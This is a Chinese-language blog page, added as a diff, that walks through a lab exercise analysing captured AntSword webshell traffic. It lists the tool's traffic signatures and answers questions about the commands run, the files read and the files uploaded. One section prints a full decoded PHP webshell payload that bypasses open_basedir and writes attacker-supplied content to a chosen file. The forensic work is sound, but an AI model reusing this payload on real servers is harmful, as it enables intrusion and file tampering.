@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第六章 流量特征分析-蚁剑流量分析 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">第六章 流量特征分析-蚁剑流量分析</h1>
+    <div class="post-meta">
+      <time datetime="2025-02-28">2025-02-28</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18743012">https://www.cnblogs.com/Zephyr07/articles/18743012</a></p>
+</blockquote>
+<h2 id="蚁剑流量特征："><a href="#蚁剑流量特征：" class="headerlink" title="蚁剑流量特征："></a>蚁剑流量特征：</h2><ol>
+<li>通常会有认证机制，，常见参数pass和cmd，eg：pass&#x3D;5d41402abc4b2a76b9719d911017c592&amp;cmd&#x3D;ls</li>
+<li>post传参，数据量会很大，所以通常会伴有base64编码</li>
+<li>请求体都存在@ini_set(“display_errors”, “0”);@set_time_limit(0)开头</li>
+</ol>
+<h2 id="第1关-木马的连接密码是多少"><a href="#第1关-木马的连接密码是多少" class="headerlink" title="第1关:木马的连接密码是多少"></a>第1关:木马的连接密码是多少</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228125739297-1152394203.png"></p>
+<p>过滤http，找一个响应为200的请求包观察就行<br>flag{1}</p>
+<h2 id="第2关-黑客执行的第一个命令是什么"><a href="#第2关-黑客执行的第一个命令是什么" class="headerlink" title="第2关:黑客执行的第一个命令是什么"></a>第2关:黑客执行的第一个命令是什么</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228125746754-1525840833.png"></p>
+<p>之所以要从第二位开始，是因为蚁剑会加混淆，避免被杀，至于为什么是2，一个一个试<br>都交一下发现id是第一条命令<br>flag{id}</p>
+<h2 id="第3关-黑客读取了哪个文件的内容，提交文件绝对路径"><a href="#第3关-黑客读取了哪个文件的内容，提交文件绝对路径" class="headerlink" title="第3关:黑客读取了哪个文件的内容，提交文件绝对路径"></a>第3关:黑客读取了哪个文件的内容，提交文件绝对路径</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228125752919-62435906.png"></p>
+<p>倒数第三条，同样从第二位开始<br>flag{&#x2F;etc&#x2F;passwd}</p>
+<h2 id="第4关-黑客上传了什么文件到服务器，提交文件名"><a href="#第4关-黑客上传了什么文件到服务器，提交文件名" class="headerlink" title="第4关:黑客上传了什么文件到服务器，提交文件名"></a>第4关:黑客上传了什么文件到服务器，提交文件名</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228125802482-579560298.png"></p>
+<p>flag{flag.txt}</p>
+<h2 id="第5关-黑客上传的文件内容是什么"><a href="#第5关-黑客上传的文件内容是什么" class="headerlink" title="第5关:黑客上传的文件内容是什么"></a>第5关:黑客上传的文件内容是什么</h2><p>第四关的流量包url解码后倒数第二行数据hex解码得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir=@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">    $ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    $oparr=preg_split(base64_decode(&quot;Lzt8Oi8=&quot;),$opdir);</span><br><span class="line">    @array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">    foreach($oparr as $item) &#123;</span><br><span class="line">        if(!@is_writable($item))&#123;continue;&#125;;</span><br><span class="line">        $tmdir=$item.&quot;/.368479785&quot;;</span><br><span class="line">        @mkdir($tmdir);</span><br><span class="line">        if(!@file_exists($tmdir))&#123;continue;&#125;</span><br><span class="line">        $tmdir=realpath($tmdir);</span><br><span class="line">        @chdir($tmdir);</span><br><span class="line">        @ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">        $cntarr=@preg_split(&quot;/\\\\|\//&quot;,$tmdir);</span><br><span class="line">        for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;</span><br><span class="line">            @chdir(&quot;..&quot;);</span><br><span class="line">        &#125;;</span><br><span class="line">        @ini_set(&quot;open_basedir&quot;,&quot;/&quot;);</span><br><span class="line">        @rmdir($tmdir);</span><br><span class="line">        break;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line">function asenc($out)&#123;return $out;&#125;;</span><br><span class="line">function asoutput()&#123;</span><br><span class="line">    $output=ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;6960&quot;.&quot;cb205&quot;;</span><br><span class="line">    echo @asenc($output);</span><br><span class="line">    echo &quot;1e0a&quot;.&quot;91914&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try&#123;</span><br><span class="line">    $f=base64_decode(substr($_POST[&quot;t41ffbc5fb0c04&quot;],2));</span><br><span class="line">    $c=$_POST[&quot;ld807e7193493d&quot;];</span><br><span class="line">    $c=str_replace(&quot;\r&quot;,&quot;&quot;,$c);</span><br><span class="line">    $c=str_replace(&quot;\n&quot;,&quot;&quot;,$c);</span><br><span class="line">    $buf=&quot;&quot;;</span><br><span class="line">    for($i=0;$i&lt;strlen($c);$i+=2)</span><br><span class="line">        $buf.=urldecode(&quot;%&quot;.substr($c,$i,2));</span><br><span class="line">    echo(@fwrite(fopen($f,&quot;a&quot;),$buf)?&quot;1&quot;:&quot;0&quot;);</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">    echo &quot;ERROR://&quot;.$e-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br><span class="line">&amp;ld807e7193493d=666C61677B77726974655F666C61677D0A</span><br><span class="line">&amp;t41ffbc5fb0c04=0ZL3Zhci93d3cvaHRtbC9mbGFnLnR4dA==</span><br></pre></td></tr></table></figure>
+
+<p>● 从POST请求中获取两个参数t41ffbc5fb0c04和ld807e7193493d。<br>● t41ffbc5fb0c04经过Base64解码并去除前两个字符，得到文件路径。<br>● ld807e7193493d是要写入文件的内容。<br>flag{write_flag}</p>
+<h2 id="第6关-黑客下载了哪个文件，提交文件绝对路径"><a href="#第6关-黑客下载了哪个文件，提交文件绝对路径" class="headerlink" title="第6关:黑客下载了哪个文件，提交文件绝对路径"></a>第6关:黑客下载了哪个文件，提交文件绝对路径</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202502/3551469-20250228125825623-1301702917.png"></p>
+<p>flag{&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php}</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/02/28/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/" class="prev">← 第六章 流量特征分析-蚂蚁爱上树</a>
+    
+    
+      <a href="/2025/02/28/%E7%AC%AC%E4%BA%94%E7%AB%A0-Windows-%E5%AE%9E%E6%88%98-evtx-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/" class="next">第五章 Windows 实战-evtx 文件分析 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
